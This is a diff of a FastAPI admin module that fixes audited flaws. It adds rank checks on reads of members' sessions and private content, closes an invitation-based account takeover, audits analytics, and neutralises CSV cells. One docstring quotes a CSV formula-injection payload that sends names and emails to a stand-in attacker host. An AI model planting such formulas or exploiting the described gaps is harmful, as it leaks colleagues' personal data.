@@ -20,9 +20,10 @@ from fastapi import APIRouter, Depends, HTTPException, Query, Request
 from pydantic import BaseModel, Field
 
 from .. import db
+from ..artifacts.render.csv import MAX_CELL_CHARS, cell_text, neutralise
 from ..config import settings
 from . import features as feature_access
-from . import passwords, store
+from . import invites, passwords, store
 from .api import _token_hash
 from .principal import Principal, audit, require_capability
 from .rbac import Cap, Role, assignable_roles, outranks
@@ -62,6 +63,26 @@ async def _target_member(principal: Principal, user_id: int) -> Dict[str, Any]:
     if row is None:
         raise HTTPException(status_code=404, detail="No such member.")
     return row
+
+
+async def _inspectable_member(principal: Principal, user_id: int) -> Dict[str, Any]:
+    """`_target_member` plus the rank rule, for every route that READS a
+    member's sessions or content.
+
+    The management routes (status, remove, reset-password, sessions/revoke,
+    access) always carried `outranks`; the read routes beside them did not, so
+    an admin could list a super admin's live sessions with their IPs and user
+    agents, and open the super admin's private conversations, uploads and
+    reports through the audited viewer — whose audit log the admin cannot read,
+    so the only person able to notice was the one being read (AUDIT.md F029 and
+    N007, 2026-09-13). Reading your own is always allowed. The refusal is 404,
+    not 403: this surface never confirms which objects exist to someone who
+    may not see them.
+    """
+    target = await _target_member(principal, user_id)
+    if user_id != principal.user_id and not outranks(principal.role, target["role"]):
+        raise HTTPException(status_code=404, detail="No such member.")
+    return target
 
 
 # ---------------------------------------------------------------------------
@@ -141,7 +162,18 @@ async def member_detail(
     principal: Principal = Depends(require_capability(Cap.MEMBERS_READ)),
 ) -> dict:
     row = await _target_member(principal, user_id)
-    stats = await db.run_in_thread(store.admin_user_overview, user_id)
+    # The member ROW is the member list and stays on MEMBERS_READ. The stats
+    # are that person's lifetime consumption — conversations, messages,
+    # uploads, reports, memory facts, research runs — which is what the
+    # content viewer counts, so they follow the viewer's rank rule: once an
+    # admin was refused a super admin's conversations, this header still said
+    # how many there were (found in the F078 sweep, 2026-09-13). `None`, never
+    # zeros — a withheld count must not read as "used nothing", and the page
+    # already renders a missing count as a dash.
+    may_inspect = user_id == principal.user_id or outranks(principal.role, row["role"])
+    stats = (
+        await db.run_in_thread(store.admin_user_overview, user_id) if may_inspect else None
+    )
     return {"member": _member_payload(row), "stats": stats}
 
 
@@ -286,7 +318,7 @@ async def member_sessions(
     user_id: int,
     principal: Principal = Depends(require_capability(Cap.SESSIONS_MANAGE)),
 ) -> dict:
-    await _target_member(principal, user_id)
+    await _inspectable_member(principal, user_id)
     rows = await db.run_in_thread(
         lambda: store.list_sessions(user_id, live_only=False)
     )
@@ -379,7 +411,7 @@ async def member_conversations(
     offset: int = Query(0, ge=0),
     principal: Principal = Depends(require_capability(Cap.WORKSPACE_CONTENT_READ)),
 ) -> dict:
-    await _target_member(principal, user_id)
+    await _inspectable_member(principal, user_id)
     rows, total = await db.run_in_thread(
         lambda: store.admin_user_conversations(user_id, limit=limit, offset=offset)
     )
@@ -407,7 +439,7 @@ async def member_conversation(
     principal: Principal = Depends(require_capability(Cap.WORKSPACE_CONTENT_READ)),
 ) -> dict:
     """The audit conversation viewer: full messages, read-only. Audited."""
-    await _target_member(principal, user_id)
+    await _inspectable_member(principal, user_id)
 
     def work() -> Optional[Dict[str, Any]]:
         conversation = db.get_conversation(user_id, conversation_id)
@@ -458,7 +490,7 @@ async def member_uploads(
     offset: int = Query(0, ge=0),
     principal: Principal = Depends(require_capability(Cap.WORKSPACE_CONTENT_READ)),
 ) -> dict:
-    await _target_member(principal, user_id)
+    await _inspectable_member(principal, user_id)
     rows, total = await db.run_in_thread(
         lambda: store.admin_user_uploads(user_id, limit=limit, offset=offset)
     )
@@ -484,7 +516,7 @@ async def member_reports(
     user_id: int,
     principal: Principal = Depends(require_capability(Cap.WORKSPACE_CONTENT_READ)),
 ) -> dict:
-    await _target_member(principal, user_id)
+    await _inspectable_member(principal, user_id)
     rows = await db.run_in_thread(store.list_report_files, user_id)
     return {
         "reports": [
@@ -562,11 +594,37 @@ async def create_invitation(
     def work() -> Dict[str, Any]:
         existing = store.get_user_by_email(email)
         if existing is not None:
-            member = store.membership(int(existing["id"]))
-            if member is not None and existing["status"] == "active":
-                raise HTTPException(
-                    status_code=409, detail="That person is already a member."
-                )
+            # The guard here used to fire only for an ACTIVE member, and
+            # accepting an invitation CLAIMS an existing account (new password,
+            # reactivated, membership upserted, signed in). So an admin could
+            # invite a removed or deactivated account's address — a former
+            # super admin's included — accept the link themselves and BE that
+            # person (AUDIT.md F028, 2026-09-13). The rank rule every other
+            # action on a member obeys now governs this one; invites.py holds
+            # it so the acceptance path can apply the same definition.
+            refusal = invites.claim_refusal(
+                principal.role,
+                target_user=existing,
+                target_membership=store.membership(int(existing["id"])),
+            )
+            if refusal is not None:
+                if refusal.audited:
+                    # Recorded BEFORE the refusal is raised: an attempt to
+                    # reach an account above your rank is the event this log
+                    # exists for, and it must not read as nothing happening.
+                    audit(
+                        principal,
+                        request,
+                        "invitation_refused",
+                        target_user_id=int(existing["id"]),
+                        meta={
+                            "email": email,
+                            "role": role.value,
+                            "reason": refusal.reason,
+                            "target_role": refusal.target_role,
+                        },
+                    )
+                raise HTTPException(status_code=refusal.status, detail=refusal.detail)
         token = secrets.token_urlsafe(32)
         inv = store.create_invitation(
             workspace_id=principal.workspace_id,
@@ -777,14 +835,55 @@ def _analytics_member_row(row: Dict[str, Any]) -> Dict[str, Any]:
     return out
 
 
+def _csv_field(value: Any) -> str:
+    """One usage-export cell, written by the artifact CSV writer's rule.
+
+    The display name is chosen by the INVITED PERSON at /auth/invitations/accept
+    with no character restriction, and the export was a bare csv.writer. A
+    member named `=HYPERLINK("http://attacker/?x="&A2&B2,"Open")` planted a
+    formula that ran in the super admin's spreadsheet the moment they opened
+    this file, carrying their colleagues' names and emails to an outside URL
+    (AUDIT.md N027, 2026-09-13).
+
+    Deliberately NOT a second convention: this is `write_csv`'s per-cell step
+    from artifacts/render/csv.py, in its order — `cell_text` (which strips the
+    zero-width characters that hid a lead from the check, "\\ufeff=cmd"), then
+    `neutralise` (an apostrophe in front of `= + - @ TAB CR`, signed plain
+    numbers exempt), then the FIELD cut to MAX_CELL_CHARS with the apostrophe
+    counted. A display name that legitimately starts with "-" or "@" gets the
+    visible apostrophe; that is the trade-off that module already made.
+    """
+    field = neutralise(cell_text(value))
+    return field[:MAX_CELL_CHARS] if len(field) > MAX_CELL_CHARS else field
+
+
+#: Why the two usage routes below take ANALYTICS_READ and not WORKSPACE_READ.
+#: They return one row per named person — email, last activity, messages and
+#: tool runs — and rbac.py states that per-person consumption is SUPER_ADMIN
+#: only ("closer to the audit log than to the member list"). They were gated on
+#: WORKSPACE_READ, an ordinary admin capability, so the rule held on the
+#: analytics console and not here, and the plain read left no audit row at all
+#: (AUDIT.md F078 / N006, 2026-09-13). Swept at the same time: /overview stays
+#: on WORKSPACE_READ because it returns workspace counts, never a person; the
+#: /members routes are the member list MEMBERS_READ exists for; nothing else in
+#: this file returns per-person consumption.
+
+
 @router.get("/analytics")
 async def analytics(
+    request: Request,
     range: str = Query("1m", pattern="^(7d|1m|3m|6m|12m)$"),
-    principal: Principal = Depends(require_capability(Cap.WORKSPACE_READ)),
+    principal: Principal = Depends(require_capability(Cap.ANALYTICS_READ)),
 ) -> dict:
     """Workspace usage for a window: totals, a daily series, the route mix,
-    and one row per member (including the members who used nothing)."""
+    and one row per member (including the members who used nothing).
+
+    Audited like the export: a table of who used what is the same read
+    whether it arrives as a page or as a file."""
     since, until, days = _window(range)
+    await db.run_in_thread(
+        audit, principal, request, "analytics_viewed", meta={"range": range}
+    )
     summary = await db.run_in_thread(
         store.usage_summary, principal.workspace_id, since, until
     )
@@ -827,7 +926,7 @@ async def analytics(
 async def analytics_export(
     range: str = Query("1m", pattern="^(7d|1m|3m|6m|12m)$"),
     request: Request = None,  # type: ignore[assignment]
-    principal: Principal = Depends(require_capability(Cap.WORKSPACE_READ)),
+    principal: Principal = Depends(require_capability(Cap.ANALYTICS_READ)),
 ):
     """The per-member table as CSV — the same numbers the page shows.
 
@@ -851,10 +950,10 @@ async def analytics_export(
     ]
     buffer = io.StringIO()
     writer = csv.writer(buffer)
-    writer.writerow(columns)
+    writer.writerow([_csv_field(c) for c in columns])
     for row in rows:
         payload = _analytics_member_row(row)
-        writer.writerow([payload.get(c, "") for c in columns])
+        writer.writerow([_csv_field(payload.get(c, "")) for c in columns])
     buffer.seek(0)
     stamp = datetime.now(timezone.utc).strftime("%Y%m%d")
     return StreamingResponse(
@@ -934,7 +1033,7 @@ async def download_member_upload(
 
     from ..uploads import upload_root
 
-    await _target_member(principal, user_id)
+    await _inspectable_member(principal, user_id)
 
     def work() -> Optional[Dict[str, Any]]:
         upload = db.get_upload(upload_id)
@@ -985,7 +1084,7 @@ async def download_member_report(
     from ..config import settings
     from ..core.report_paths import ReportPathError, resolve_report_file
 
-    await _target_member(principal, user_id)
+    await _inspectable_member(principal, user_id)
     owner = await db.run_in_thread(store.report_owner, filename)
     if owner != user_id:
         raise HTTPException(status_code=404, detail="No such report.")
